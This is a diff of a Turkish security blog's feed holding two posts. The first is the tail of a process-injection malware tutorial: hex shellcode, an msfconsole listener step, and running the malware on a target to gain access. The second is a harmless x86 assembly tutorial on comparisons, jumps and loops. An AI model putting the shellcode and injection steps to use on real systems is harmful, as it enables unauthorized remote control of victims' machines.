+<span class="s2">"</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">40"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">3c"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">41"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">ff"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">d5"</span>
+</code></pre></div></div>
+
+<p>Daha sonra bu shellcode’u kodlara ekliyoruz.</p>
+
+<p>Ardından msfconsole’u başlatalım ve aşağıdaki şu kodları yazalım:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*v-DCvi7KOuV5lcdLI34M1Q.png" /></p>
+<h4> Hedef Sistemi dinlemeye alınması </h4>
+
+<p>Bu işlemler ile artık hedef sistemi dinlemeye alıyoruz. Kullanıcı programı çalıştırdığı takdirde sisteme bağlantımız açılacak.</p>
+
+<p>Şimdi hedef sistemden programı çalıştıracağız. Ben örnek açısından malware’i paint üzerinden çalıştıracağım:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*xLaiXogqndZd5oTTiSfGEg.png" /></p>
+<h4> Hedef Sistemde Malware’in çalıştırılması </h4>
+
+<p>Programı çalıştırdık! Şimdi hedef sistemde son duruma tekrar bakalım:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*IRDmlSWMl38ap3_f1UxfCQ.png" /></p>
+<h4> Sonuç </h4>
+
+<p>Veee Sihir gerçekleşti! Hedef sisteme erişimiz sağlandı! Good Job BRO!</p>
+
+<p>Bu serimiz bu kadardı. Umarım gerçekten siz okuyuculara bir şey katabilmişimdir..</p>
+
+<p>Diğer seride görüşmek üzere!</p>]]></content><author><name>bekoo</name></author><category term="malware" /><category term="malware-development" /><category term="reverse-engineering" /><category term="process-injection" /><summary type="html"><![CDATA[Process Injection Attacks]]></summary></entry><entry><title type="html">Conditionals and Loops in Assembly</title><link href="http://localhost:4000/2023/04/16/Conditionals-and-Unconditionals-in-Assembly.html" rel="alternate" type="text/html" title="Conditionals and Loops in Assembly" /><published>2023-04-16T00:00:00+03:00</published><updated>2023-04-16T00:00:00+03:00</updated><id>http://localhost:4000/2023/04/16/Conditionals%20and%20Unconditionals%20in%20Assembly</id><content type="html" xml:base="http://localhost:4000/2023/04/16/Conditionals-and-Unconditionals-in-Assembly.html"><![CDATA[<p>Merhabalar. bu blogumda Assembly’de döngülerden ve Koşullu ve Koşulsuz karşılaştırmaları ele alacağım. Bu iki konuyu neden tek bir çatı altında anlattığımı ilerideki dakikalarda bahsedeceğim.</p>
+
+<h2 id="0x0--conditionals-karşılaştırmalar">0x0 – Conditionals (Karşılaştırmalar)</h2>
+<p>Teorik olarak karşılaştırmalardan bahsetmeyeceğim ancak ufak bir tanım yapmak gerekirse, belirtilen koşula bağlı olarak programın akışını değiştirilmesini sağlar.</p>
+
+<p>Yüksek seviyeli birçok dilde karşılaştırmalar için if-else kullanılır bunu zaten biliyorsunuzdur. Assembly’de karşılaştırmalar diğer dillere göre farklıdır.</p>
+
+<p>Assembly’de karşılaştırma durumu ikiye ayrılır: Conditional Jump (Koşullu Atlama) ve Unconditional Jump (Koşulsuz Atlama) olarak ikiye ayrılır. Bu konuda ikisini de detaylandırmaya çalışacağım.</p>
+
+<p>Conditional Jump yani koşullu zıplamanın isminden de anlaşıldığı gibi koşulun sağlanması durumunda programın akışını değiştirmesini sağlar. Unconditional Jump yani koşulsuz zıplama ise direkt bir koşul olmadan programın akışını değiştirir. Özellikle Binary Exploitation tarafıyla ilgileniyorsanız bufferoverflow saldırılarında unconditional jump önemli bir konudur programın akışını değiştirmek açısından.</p>
+
+<h2 id="0x00---cmp-instruction">0x00 - CMP Instruction</h2>
+<p>Assembly’de karşılaştırma yapmak için cmp Instruction’u kullanıyoruz. Bu cmp Instruction’u iki işleneni karşılaştırmak için kullanılır. Program bu Instruction’u kullanırken, iki işlenenin eşit olup olmadığını anlamak için birbirinden çıkarır. ‘Çıkarmak’ derken ikisi arasında bir çıkarma işlemi yapar. Bu karşılaştırma sonucunu ZF (Zero Flag) ile anlayabiliriz. Eğer cmp sonucunda Zero Flag 0 olarak resetlenmişse karşılaştıranların eşit olmadığını gösterir ancak Zero flag 1 olarak setlenirse iki tarafın eşit olduğunu gösterir.</p>
+
+<p>Burada Zero Flag’ın ne olduğunu anlamamız gerekiyor. Zero Flag, herhangi bir işlem sonucunun sıfır olması durumunda 1 değerini alır. Ancak herhangi bir işlem sonucu sıfır ile sonuçlanmazsa 0 ile resetlenir.</p>
+
+<p>Konu biraz karışık olduğu için örnek kod ile detaylandıralım:​</p>
+
+<p>Kod:</p>
+
+<pre><code class="language-asm">section .data
+    msg: db "Assembly with bekoo",0
+    len: equ $ - msg
+
+section .text
+    global _start
+
+_start:
+    mov ah,5    ; ah register'a 5 yükle
+    mov al,5    ; al register'a 5 yükle
+    cmp ah,al   ; ah ile al register'ı karşılaştır
+    jz _printMessage  ; karşılaştırma sonucu 0 ise _printMessage fonksiyonuna git
+
+_exit:
+    ; programı bitir
+    mov eax,1
+    xor ebx,ebx
+    int 0x80
+
+_printMessage:
+    ; msg'ı ekrana bastır
+    mov eax,4
+    mov ebx,1
+    mov ecx,msg
+    mov edx,len
+    int 0x80
+
+    ;  _exit fonksiyonuna git
+    jmp _exit
+</code></pre>
+
+<p>Bu programda ah ile al register’a 5 değerini gönderilir. Ardından yukarıda bahsettiğim cmp aracılığıyla karşılaştırma yapılır. Eğer bu karşılaştırma sonucu 0 ile sonuçlanırsa program _printMessage adlı fonksiyona gönderiliyor değil ise _exit fonksiyonuna gidip program bitirilir.</p>
+
+<p>Burada karşılaştırmanın 0 olması demek, karşılaştırılan iki değerin de eşit olduğunu gösterir. Mesela ah register’a 3 ve al register’a 5 gönderip tekrar karşılaştırmaya tabii tuttuğumuzda Zero Flag set edilmez. Çünkü cmp Instruction’ın yaptığı çıkartma işlemi sonucu 0 olmayacak.</p>
+
+<p>Şimdi ise karşılaştırma sonucunda Zero Flag, gerçekten set edilmiş mi gdb ile ona bakalım:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas _start
+Dump of assembler code <span class="k">for function </span>_start:
+   0x0000000000401000 &lt;+0&gt;:    mov    ah,0x5
+   0x0000000000401002 &lt;+2&gt;:    mov    al,0x5
+   0x0000000000401004 &lt;+4&gt;:    cmp    ah,al
+   0x0000000000401006 &lt;+6&gt;:    je     0x401011 &lt;_printMessage&gt;
+End of assembler dump.
+</code></pre></div></div>
+
+<p>gdb ile _start içeriğine baktığımızda bu kodlar bizi karşılıyor. Şimdi ise break *0x0000000000401006 yazıp karşılaştırmanın sonucuna bakalım. Programın breakpoint koyduğum kısma dikkat edin. Program tam _printMessage adlı fonksiyona gitmeden duracak:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas
+Dump of assembler code <span class="k">for function </span>_start:
+   0x0000000000401000 &lt;+0&gt;:    mov    ah,0x5
+   0x0000000000401002 &lt;+2&gt;:    mov    al,0x5
+   0x0000000000401004 &lt;+4&gt;:    cmp    ah,al
+<span class="o">=&gt;</span> 0x0000000000401006 &lt;+6&gt;:    je     0x401011 &lt;_printMessage&gt;
+End of assembler dump.
+</code></pre></div></div>
+
+<p>Programın nerede olduğunu =&gt; işareti ile anlayabiliriz. Bu işaret, çalıştırılacak kodu gösterir. Şimdi ise info registers $eflags ile hangi flag’ların set edildiğine bakalım:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>i r <span class="nv">$eflags</span>
+eflags         0x246               <span class="o">[</span> PF ZF IF <span class="o">]</span>
+</code></pre></div></div>
+
+<p>eflags register’ın içerisinde gördüğünüz flag’lar, set edilen flag’lardır. Dolayasıyla programın şuan ki kısmında PF, ZF ve IF flag’ları set edilmiş olduğunu görebiliyoruz. Yani programı devam ettirdiğimizde, jz karşılaşmayı sağladığı için _printMessage adlı fonksiyona gidecek ve mesajı ekrana bastıracak.</p>
+
+<p>jz veya jmp gibi şeyler kafanızı karıştırmasın şimdi ise bunları detaylandıracağım. Burada sadece anlamız gereken şey cmp’ın mantığı ve Zero Flag’ın ne işe yaradığı.</p>
+
+<h2> 0x01 - Conditional Jump (Koşullu Atlama) </h2>
+
+<p>Koşullu zıplamanın zaten adıyla ne olduğunu anlamışsınızdır. Belirli koşulun sağlanması durumunda programın akışını değiştirmesini sağlar.</p>
+
+<p>Koşullu işlemler için bir çok Instruction bulunmaktadır. Koşullar için kullanılan genellike arimetiksel Instruction’lardır. Bu konumda ise sadece bunlara yer vereceğim.</p>
+
+<p>Bu kadar şeyden sonra yukarıdaki örnek Assembly koduna tekrar dönelim:</p>
+
+<p>Kod:</p>
+<pre><code class="language-asm">_start:
+    mov ah,5    ; ah register'a 5 yükle
+    mov al,5    ; al register'a 5 yükle
+    cmp ah,al   ; ah ile al register'ı karşılaştır
+    jz _printMessage  ; karşılaştırma sonucu 0 ise _printMessage fonksiyonuna git
+</code></pre>
+
+<p>Bu kodda JZ Instruction’u kullandım. Siz burada JZ değil de JE’de kullansanız program aynı sonucu gösterir.</p>
+
+<h2> 0x02 - Unconditional Jump (Koşulsuz Atlama) </h2>
+
+<p>Yep, şimdi ise asıl önemli konuya geldik.</p>
+
+<p>Conditional için koşullu olarak programın akışını değiştirdiğini söylemiştim. Unconditional’da ise koşula bağlı olmadan direkt programın akışını değiştirir.</p>
+
+<p>Unconditional için sadece jmp Instruction kullanılır. Örnek Assembly kodunu ele alayım:
+​
+Kod:</p>
+
+<pre><code class="language-asm">_printMessage:
+    mov eax,4
+    mov ebx,1
+    mov ecx,msg
+    mov edx,len
+    int 0x80
+
+    jmp _exit
+</code></pre>
+
+<p>_printMessage adlı fonksiyon içerisine baktığımızda write syscall ile bir ekrana bastırma işlemi yapılıyor ardından jmp aracılığıyla program, _exit fonksiyona gidiyor ve program sonlanıyor.</p>
+
+<p>Yani kısaca jmp ile koşula bağlı olmadan programın akışını değiştirebilirsiniz.</p>
+
+<h2> 0x1 – Loops </h2>
+
+<p>Gel gelelim asıl konumuza, döngülerrr.</p>
+
+<p>Bilirsiniz döngüler, programlamada dillerinde önemli bir konudur. Assembly’de ise bambaşka bir yeri var.</p>
+
+<p>Eğer Assembly ile döngü oluşturmak isterseniz ya yukarıda bahsettiğim koşullu atlama yöntemi ile ya da loop Instruction’u ile yapabilirsiniz. Bu konu da ikisinden de bahsedeceğim.</p>
+
+<h2> 0x10 - Loop Instruction </h2>
+
+<p>loop Instruction’u, döngüler için kullandığımız bir komuttur. İşlevli bir Instruction olsa da kendi görüşüme göre pek yaygın bir kullanımı yok. Daha çok yukarıda bahsettiğim, koşullu atlamalar ile döngüler oluşturmak daha yaygındır.</p>
+
+<p>Her şeyden önce loop Instruction’un çalışma mantığını anlamak gerek. Bu Instruction, ecx (Extended Control Register) register’ına verilen değere göre komutu çalıştırır. Peki, ‘neden ecx register? Farklı register’a değer veremez miyiz?’ diye bir soru gelebilir, Hayır. Eğer loop instruction ile çalışacaksanız sadece ecx’e değer vererek döngü sayısını belirleyebilirsiniz. ecx’in işlemcide döngünün sayacını tutmak gibi görevleri vardır.</p>
+
+<p>Aynı zamanda loop instruction, her çalıştığında ecx’den bir değer azaltır. Mesela siz bir mesajı 10 defa ekrana bastırmak istiyorsunuz ve ecx’e 10 değerini verdiniz. loop komutu her çalıştığında ecx’i 1 azaltır. Kafanız karışmasın örnek ile detaylandıracağım.</p>
+
+<p>Şimdi ise basit bir örnek yapalım. Örneğimiz, “bekoo” mesajını 10 kere bastırmak olsun:
+​
+Kod:</p>
+
+<pre><code class="language-asm">BITS 32
+
+section .data
+    msg: db "bekoo", 0
+    len: equ $ - msg
+
+section .text
+    global _start
+
+_start:
+    mov ecx,10 ; döngü sayısı 10 olarak belirtildi
+    jmp _loop   ; programı _loop fonksiyona yönelt
+
+_exit:
+    ; programı bitir
+    mov eax,1
+    xor ebx,ebx
+    int 0x80
+
+_loop:
+    push ecx ; ecx'in değerini stack' gönder
+    ; ecx'in değerini stack'e gönderme sebebimiz, kodun devamında ekrana bastırma işlemi için ecx'i kullanacağız dolayasıyla bu değeri kaybetmemek için stack'e gönderiyoruz.
+    
+    ; mesajı ekrana bastır
+    mov eax,4
+    mov ebx,1
+    mov ecx,msg
+    mov edx,len
+    int 0x80
+
+    pop ecx ; stack'e gönderilen değeri al
+    loop _loop  ; _başa dön
+
+    cmp ecx,0 ; ecx'in değeri 0 ile karşılaştırılıyor
+    jmp _exit   ; eğer ecx'in değeri 0 olmuşsa jmp ile programı _exit fonksiyona yönelt
+</code></pre>
+
+<p>Bu program, 10 kez ‘bekoo’ mesajını ekrana bastırır.</p>
+
+<p>Programda başta ecx’e 10 değeri gönderilir. Buradaki 10, döngünün kaç defa çalışacağını temsil eder. Siz buraya 10 değil de mesela 3 girseniz 3 defa çalışacaktır. Ardından jmp aracılığıyla program, _loop fonksiyonuna yönlendiriliyor. Bu fonksiyon içerisinde ise mesaj bastırılmadan hemen önce ecx’in değeri stack’e gönderiliyor. Bunun sebebi, ilerideki kodlarda write syscall ile ekrana mesaj bastırma işlemi gerçekleştirelecek. Eğer ecx’in değeri stack’e gönderilmeden direkt mesajı ekrana bastırırsak, döngü sayısını kaybedebiliriz.</p>
+
+<p>Mesaj ekrana bastırıldıktan sonra pop aracılığıyla stack’e gönderilen değer geri alınıyor ve loop instruction ile bu işlemler tekrar ediyor. Taaa ki, ecx register içerisinde değer 0 olana kadar. Hatırlayın, loop instruction’u ecx’a bağlı çalışır ve her çalıştığında ecx’den 1 değer azaltır.</p>
+
+<p>Özellikle bu kodda, conditionals ve unconditionals konuların daha anlaşılır olması için jmp ve cmp komutlarını da dahil ettim.</p>
+
+<p>Arka plana bakmak için gdb kullanalım:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas _start
+Dump of assembler code <span class="k">for function </span>_start:
+   0x0000000000401000 &lt;+0&gt;:    mov    ecx,0xa
+   0x0000000000401005 &lt;+5&gt;:    jmp    0x401010 &lt;_loop&gt;
+End of assembler dump.
+</code></pre></div></div>
+
+<p>_start fonksiyonu disassemble ettiğimiz zaman bu kodları görüyoruz. Yukarıda bahsettiğim gibi, ecx’e hexdecimal olarak 10 gönderiliyor ve program jmp ile _loop’a yönlendiriliyor. Şimdi ise _loop’u disassemble edelim:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas _loop
+Dump of assembler code <span class="k">for function </span>_loop:
+   0x0000000000401010 &lt;+0&gt;:     push   rcx
+   0x0000000000401011 &lt;+1&gt;:     mov    eax,0x4
+   0x0000000000401016 &lt;+6&gt;:     mov    ebx,0x1
+   0x000000000040101b &lt;+11&gt;:    mov    ecx,0x402000
+   0x0000000000401020 &lt;+16&gt;:    mov    edx,0xf
+   0x0000000000401025 &lt;+21&gt;:    int    0x80
+   0x0000000000401027 &lt;+23&gt;:    pop    rcx
+   0x0000000000401028 &lt;+24&gt;:    loop   0x401010 &lt;_loop&gt;
+   0x000000000040102a &lt;+26&gt;:    cmp    ecx,0x0
+   0x000000000040102d &lt;+29&gt;:    jmp    0x401007 &lt;_exit&gt;
+End of assembler dump.
+</code></pre></div></div>
+
+<p>_loop içerisine başta baktığımızda başta rcx değeri - program arka planda rcx kullanmış. Burada ecx’in değeri bulunmaktadır - stack’e gönderildiği ardından ekrana bastırma işlemi yapıldığı görülmektedir. Daha sonra pop ile stack’e gönderilen değer geri alınıyor ve loop komutu çalıştırılıyor.</p>
+
+<p>loop instruction’un her çalıştığında ecx’den bir değer azaltığını söylemiştim. Şimdi ise canlı canlı bir de buradan bakalım. Başta break *0x0000000000401028 ile loop komutunun olduğu yerde programı durduralım ve ardından çalıştıralım:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas
+Dump of assembler code <span class="k">for function </span>_loop:
+   0x0000000000401010 &lt;+0&gt;:   push   rcx
+   0x0000000000401011 &lt;+1&gt;:   mov    eax,0x4
+   0x0000000000401016 &lt;+6&gt;:   mov    ebx,0x1
+   0x000000000040101b &lt;+11&gt;:  mov    ecx,0x402000
+   0x0000000000401020 &lt;+16&gt;:  mov    edx,0xf
+   0x0000000000401025 &lt;+21&gt;:  int    0x80
+   0x0000000000401027 &lt;+23&gt;:  pop    rcx
+<span class="o">=&gt;</span> 0x0000000000401028 &lt;+24&gt;:  loop   0x401010 &lt;_loop&gt;
+   0x000000000040102a &lt;+26&gt;:  cmp    ecx,0x0
+   0x000000000040102d &lt;+29&gt;:  jmp    0x401007 &lt;_exit&gt;
+End of assembler dump.
+</code></pre></div></div>
+
+<p>Program, tam loop komutu çalıştırılmadan hemen durdu. Tam burada info registers $ecx aracılığıyla ecx’in durumuna bir bakalım:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info registers <span class="nv">$ecx</span>
+ecx            0xa                 0xa
+</code></pre></div></div>
+
+<p>0xa’nın decimal karşılığı 10’dur. Dolayasıyla şuan ecx’in içerisinde 10 değeri var. Şimdi programı ni aracılığıyla devam ettirelim ve loop komutu çalıştırıldıktan sonra tekrar bakalım:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas
+Dump of assembler code <span class="k">for function </span>_loop:
+<span class="o">=&gt;</span> 0x0000000000401010 &lt;+0&gt;:    push   rcx
+   0x0000000000401011 &lt;+1&gt;:    mov    eax,0x4
+   0x0000000000401016 &lt;+6&gt;:    mov    ebx,0x1
+   0x000000000040101b &lt;+11&gt;:   mov    ecx,0x402000
+   0x0000000000401020 &lt;+16&gt;:   mov    edx,0xf
+   0x0000000000401025 &lt;+21&gt;:   int    0x80
+   0x0000000000401027 &lt;+23&gt;:   pop    rcx
+   0x0000000000401028 &lt;+24&gt;:   loop   0x401010 &lt;_loop&gt;
+   0x000000000040102a &lt;+26&gt;:   cmp    ecx,0x0
+   0x000000000040102d &lt;+29&gt;:   jmp    0x401007 &lt;_exit&gt;
+End of assembler dump.
+</code></pre></div></div>
+
+<p>Göründüğü gibi, _loop fonksiyonun başına tekrar dönüldü. Aynı şekilde tekrar info registers $ecx ile ecx’in durumuna tekrar bakalım:</p>
+
+<p>Kod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info registers <span class="nv">$ecx</span>
+ecx            0x9                 0x9
+</code></pre></div></div>
+
+<p>Programın şuan ki kısmında ise ecx’in içerisinde 9 değeri var. Yani ecx’in 1 değer azaltıldığını görebiliyoruz. Bu program böyle devam edecek ve en sonunda 0 olduğunda program bitecek.</p>
+
+<p>Genel olarak loop instruction’un çalışma mantığı bu şekilde. Şimdi ise diğer konuya geçelim.</p>
+
+<h2> 0x11 - Loops with Conditionals </h2>
+
+<p>Şimdi ise en çok tercih ettiğimiz yönteme geldik.</p>
+
+<p>Koşullarla döngü oluşturmak sıklıkla tercih edilen bir yöntemdir.</p>
+
+<p>Konuyu aydınlatmak için basit bir örnek yapalım. Yukarıdaki uygulamanın tersini yapalım. Bu sefer ecx’i 0 değerinden başlatalım ve 10 olana kadar ‘bekoo’ mesajını ekrana bastırsın:</p>
+
+<p>Kod:</p>
+
+<pre><code class="language-asm">section .data
+        msg: db "bekoo", 0
+        len: equ $ - msg
+
+section .text
+        global _start
+
+_start:
+        mov ecx,1
+        jmp _loop
+
+_exit:
+        mov eax,1
+        xor ebx,ebx
+        int 0x80
+
+_loop:
+        cmp ecx, 10 ; ecx'in değeri 10 ile karşılaştırılıyor
+        jz _exit  ; eğer ecx'in değeri 10 ile eşitse, program _exit fonksiyonuna yönlendirilerek program bitiriliyor
+        
+        ; bu kısımda msg ekrana bastırılır
+        mov eax,4  
+        mov ebx,1
+        mov ecx,msg
+        mov edx,len
+         int 0x80
+        jmp _loop ; _loop'un başına dön
+</code></pre>
+
+<p>Aslında bu program, loop instruction konusunda örnek olarak verdiğim assembly kodunun tam tersi. Loop instruction’u verilen değeri azaltırken burada arttırma yapılarak koşullar ile programı yönetiyoruz.</p>]]></content><author><name>bekoo</name></author><category term="x86-assembly" /><category term="nasm" /><summary type="html"><![CDATA[Process Injection Attacks]]></summary></entry></feed>
